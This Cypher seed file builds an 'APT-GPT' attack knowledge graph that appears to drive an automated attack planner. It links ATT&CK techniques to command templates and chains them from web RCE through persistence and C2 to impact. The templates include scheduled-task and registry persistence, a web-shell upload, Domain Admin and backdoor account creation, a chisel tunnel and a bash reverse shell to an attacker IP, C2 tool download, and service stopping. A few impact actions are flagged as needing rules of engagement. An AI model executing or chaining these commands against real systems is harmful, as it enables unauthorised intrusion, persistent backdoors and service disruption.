// ============================================================================
// APT-GPT Knowledge Graph — Seed Node Import (11 P0+Easy AttackActions)
// ============================================================================
// Generated from: wiki/APT-GPT/KG-Extension-EasyWins.md
// Target:        Neo4j 5.x with APOC (optional)
// Usage:         cypher-shell -u neo4j -p PASSWORD -f kg-seed-nodes.cypher
//
// Schema:
//   (:Tactic)        — ATT&CK Tactic group (TA00xx)
//   (:Technique)     — ATT&CK Technique (T1xxx[.xxx])
//   (:AttackAction)  — concrete executable PDDL action
//   (:Precondition)  — required state to execute
//
// Edges:
//   (Technique)   -[:BELONGS_TO]-> (Tactic)
//   (AttackAction)-[:IMPLEMENTS]-> (Technique)
//   (AttackAction)-[:REQUIRES]-> (Precondition)
//   (Technique)   -[:LEADS_TO]-> (Technique)
//   (Technique)   -[:ENABLES]-> (Technique)
// ============================================================================

// ---- Tactic groups ---------------------------------------------------------
MERGE (:Tactic {id: "TA0001", name: "Initial Access"});
MERGE (:Tactic {id: "TA0003", name: "Persistence"});
MERGE (:Tactic {id: "TA0004", name: "Privilege Escalation"});
MERGE (:Tactic {id: "TA0006", name: "Credential Access"});
MERGE (:Tactic {id: "TA0011", name: "Command and Control"});
MERGE (:Tactic {id: "TA0040", name: "Impact"});

// ============================================================================
// TA0003 Persistence — 5 seed AttackActions
// ============================================================================

// --- Node 1: T1053.005 Scheduled Task -------------------------------------
MERGE (t1:Technique {id: "T1053.005", name: "Scheduled Task", difficulty: "easy"})
WITH t1
MATCH (ta:Tactic {id: "TA0003"})
MERGE (t1)-[:BELONGS_TO]->(ta)
MERGE (a1:AttackAction {
  uuid: "aa-persist-01",
  name: "schtasks_persist",
  description: "Create scheduled task to re-execute payload at logon",
  source: "Atomic Red Team T1053.005",
  supported_platforms: ["windows"],
  executor: "cmd",
  command_template: 'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f',
  cost: 0.2
})
MERGE (a1)-[:IMPLEMENTS]->(t1)
MERGE (p1:Precondition {key: "privilege_admin"})
MERGE (a1)-[:REQUIRES]->(p1);

// --- Node 2: T1505.003 Web Shell -----------------------------------------
MERGE (t2:Technique {id: "T1505.003", name: "Web Shell", difficulty: "easy"})
WITH t2
MATCH (ta:Tactic {id: "TA0003"})
MERGE (t2)-[:BELONGS_TO]->(ta)
MERGE (a2:AttackAction {
  uuid: "aa-persist-02",
  name: "webshell_drop",
  description: "Upload web shell to vulnerable web service for backdoor access",
  source: "Atomic Red Team T1505.003",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'curl -F "file=@{shell_path}" {target_upload_url}',
  cost: 0.3
})
MERGE (a2)-[:IMPLEMENTS]->(t2)
MERGE (p2:Precondition {key: "upload_endpoint_writable"})
MERGE (a2)-[:REQUIRES]->(p2);

// --- Node 3: T1098 AD Account Manipulation -------------------------------
MERGE (t3:Technique {id: "T1098", name: "Account Manipulation", difficulty: "easy"})
WITH t3
MATCH (ta:Tactic {id: "TA0003"})
MERGE (t3)-[:BELONGS_TO]->(ta)
MERGE (a3:AttackAction {
  uuid: "aa-persist-03",
  name: "ad_account_add",
  description: "Add new domain user and elevate to Domain Admins",
  source: "Atomic Red Team T1098",
  supported_platforms: ["windows"],
  executor: "cmd",
  command_template: 'net user {username} {password} /add /domain && net group "Domain Admins" {username} /add /domain',
  cost: 0.1
})
MERGE (a3)-[:IMPLEMENTS]->(t3)
MERGE (p3:Precondition {key: "privilege_domain_admin"})
MERGE (a3)-[:REQUIRES]->(p3);

// --- Node 4: T1547.001 Registry Run Key ----------------------------------
MERGE (t4:Technique {id: "T1547.001", name: "Registry Run Keys / Startup Folder", difficulty: "easy"})
WITH t4
MATCH (ta:Tactic {id: "TA0003"})
MERGE (t4)-[:BELONGS_TO]->(ta)
MERGE (a4:AttackAction {
  uuid: "aa-persist-04",
  name: "registry_run_key",
  description: "Add Run key to launch payload at user login",
  source: "Atomic Red Team T1547.001",
  supported_platforms: ["windows"],
  executor: "cmd",
  command_template: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{payload_path}" /f',
  cost: 0.2
})
MERGE (a4)-[:IMPLEMENTS]->(t4)
MERGE (p4:Precondition {key: "privilege_user"})
MERGE (a4)-[:REQUIRES]->(p4);

// --- Node 5: T1136.001 Local Account Creation ----------------------------
MERGE (t5:Technique {id: "T1136.001", name: "Local Account", difficulty: "easy"})
WITH t5
MATCH (ta:Tactic {id: "TA0003"})
MERGE (t5)-[:BELONGS_TO]->(ta)
MERGE (a5:AttackAction {
  uuid: "aa-persist-05",
  name: "local_account_add",
  description: "Create local backdoor admin account",
  source: "Atomic Red Team T1136.001",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'useradd -m -s /bin/bash {username} && echo "{username}:{password}" | chpasswd',
  cost: 0.2
})
MERGE (a5)-[:IMPLEMENTS]->(t5)
MERGE (p5:Precondition {key: "privilege_admin"})
MERGE (a5)-[:REQUIRES]->(p5);

// ============================================================================
// TA0011 Command and Control — 4 seed AttackActions
// ============================================================================

// --- Node 6: T1572 Protocol Tunneling (Chisel) ---------------------------
MERGE (t6:Technique {id: "T1572", name: "Protocol Tunneling", difficulty: "easy"})
WITH t6
MATCH (ta:Tactic {id: "TA0011"})
MERGE (t6)-[:BELONGS_TO]->(ta)
MERGE (a6:AttackAction {
  uuid: "aa-c2-01",
  name: "chisel_tunnel",
  description: "Establish SOCKS5 tunnel through HTTP for C2 channel",
  source: "chisel project",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'chisel client {attacker_ip}:{c2_port} R:socks',
  cost: 0.3
})
MERGE (a6)-[:IMPLEMENTS]->(t6)
MERGE (p6:Precondition {key: "outbound_http_allowed"})
MERGE (a6)-[:REQUIRES]->(p6);

// --- Node 7: T1132.001 Standard Encoding (base64) ------------------------
MERGE (t7:Technique {id: "T1132.001", name: "Standard Encoding", difficulty: "easy"})
WITH t7
MATCH (ta:Tactic {id: "TA0011"})
MERGE (t7)-[:BELONGS_TO]->(ta)
MERGE (a7:AttackAction {
  uuid: "aa-c2-02",
  name: "base64_c2",
  description: "Encode C2 traffic with base64 to evade simple IDS pattern match",
  source: "Atomic Red Team T1132.001",
  supported_platforms: ["windows", "linux"],
  executor: "powershell",
  command_template: 'powershell -EncodedCommand {base64_payload}',
  cost: 0.2
})
MERGE (a7)-[:IMPLEMENTS]->(t7);

// --- Node 8: T1571 Non-Standard Port -------------------------------------
MERGE (t8:Technique {id: "T1571", name: "Non-Standard Port", difficulty: "easy"})
WITH t8
MATCH (ta:Tactic {id: "TA0011"})
MERGE (t8)-[:BELONGS_TO]->(ta)
MERGE (a8:AttackAction {
  uuid: "aa-c2-03",
  name: "nonstandard_port_c2",
  description: "C2 listener on uncommon port to bypass FW rules",
  source: "Atomic Red Team T1571",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'bash -i >& /dev/tcp/{attacker_ip}/{nonstandard_port} 0>&1',
  cost: 0.3
})
MERGE (a8)-[:IMPLEMENTS]->(t8);

// --- Node 9: T1105 Ingress Tool Transfer ---------------------------------
MERGE (t9:Technique {id: "T1105", name: "Ingress Tool Transfer", difficulty: "easy"})
WITH t9
MATCH (ta:Tactic {id: "TA0011"})
MERGE (t9)-[:BELONGS_TO]->(ta)
MERGE (a9:AttackAction {
  uuid: "aa-c2-04",
  name: "ingress_tool_xfer",
  description: "Download additional tools from C2 server to target",
  source: "Atomic Red Team T1105",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'wget {tool_url} -O {tool_path} && chmod +x {tool_path}',
  cost: 0.1
})
MERGE (a9)-[:IMPLEMENTS]->(t9);

// ============================================================================
// TA0040 Impact — 2 seed AttackActions (RoE-required)
// ============================================================================

// --- Node 10: T1531 Account Access Removal -------------------------------
MERGE (t10:Technique {id: "T1531", name: "Account Access Removal", difficulty: "easy"})
WITH t10
MATCH (ta:Tactic {id: "TA0040"})
MERGE (t10)-[:BELONGS_TO]->(ta)
MERGE (a10:AttackAction {
  uuid: "aa-impact-01",
  name: "account_disable",
  description: "Disable user accounts to deny access (recoverable)",
  source: "Atomic Red Team T1531",
  supported_platforms: ["windows"],
  executor: "cmd",
  command_template: 'net user {target_user} /active:no',
  cost: 0.1,
  rules_of_engagement_required: true
})
MERGE (a10)-[:IMPLEMENTS]->(t10);

// --- Node 11: T1489 Service Stop -----------------------------------------
MERGE (t11:Technique {id: "T1489", name: "Service Stop", difficulty: "easy"})
WITH t11
MATCH (ta:Tactic {id: "TA0040"})
MERGE (t11)-[:BELONGS_TO]->(ta)
MERGE (a11:AttackAction {
  uuid: "aa-impact-02",
  name: "service_stop",
  description: "Stop critical service (recoverable)",
  source: "Atomic Red Team T1489",
  supported_platforms: ["windows", "linux"],
  executor: "bash",
  command_template: 'systemctl stop {service_name}',
  cost: 0.1,
  rules_of_engagement_required: true
})
MERGE (a11)-[:IMPLEMENTS]->(t11);

// ============================================================================
// LEADS_TO edges — typical attack chain progression
// ============================================================================

// Initial Access -> Persistence (web shell entry)
MERGE (t1190:Technique {id: "T1190"})
MERGE (t1190)-[:LEADS_TO]->(:Technique {id: "T1505.003"});

// Credential Access -> Persistence (post-DA backdoor)
MERGE (t1558:Technique {id: "T1558.003"})
MERGE (t1078:Technique {id: "T1078"})
MERGE (t1558)-[:LEADS_TO]->(t1078)
MERGE (t1078)-[:LEADS_TO]->(:Technique {id: "T1098"})
MERGE (t1078)-[:LEADS_TO]->(:Technique {id: "T1547.001"});

// Persistence -> C2 (chain to C2 after persistence established)
MERGE (:Technique {id: "T1505.003"})-[:LEADS_TO]->(:Technique {id: "T1572"})
MERGE (:Technique {id: "T1572"})-[:LEADS_TO]->(:Technique {id: "T1105"});

// C2 -> Impact (final destructive phase)
MERGE (:Technique {id: "T1105"})-[:LEADS_TO]->(:Technique {id: "T1489"});

// ============================================================================
// REQUIRES edges — precondition dependencies
// ============================================================================
MERGE (:Technique {id: "T1098"})-[:REQUIRES]->(:Technique {id: "T1078"});
MERGE (:Technique {id: "T1547.001"})-[:REQUIRES]->(:Technique {id: "T1078"});
MERGE (:Technique {id: "T1572"})-[:REQUIRES]->(:Technique {id: "T1505.003"});

// ============================================================================
// Verification queries — run these after import to confirm
// ============================================================================
//
// 1. Count nodes per type:
//    MATCH (n) RETURN labels(n)[0] AS type, count(*) ORDER BY count(*) DESC;
//
// 2. Find next actions from "Domain Admin" state:
//    MATCH (current:Technique {id: "T1078"})-[:LEADS_TO]->(next:Technique)
//    OPTIONAL MATCH (next)<-[:IMPLEMENTS]-(action:AttackAction)
//    RETURN next.id, next.name, action.name, action.cost
//    ORDER BY action.cost;
//
// 3. Trace full attack chain from web RCE to Impact:
//    MATCH path = (start:Technique {id: "T1190"})-[:LEADS_TO*]->(end:Technique {id: "T1489"})
//    RETURN path LIMIT 1;
// ============================================================================
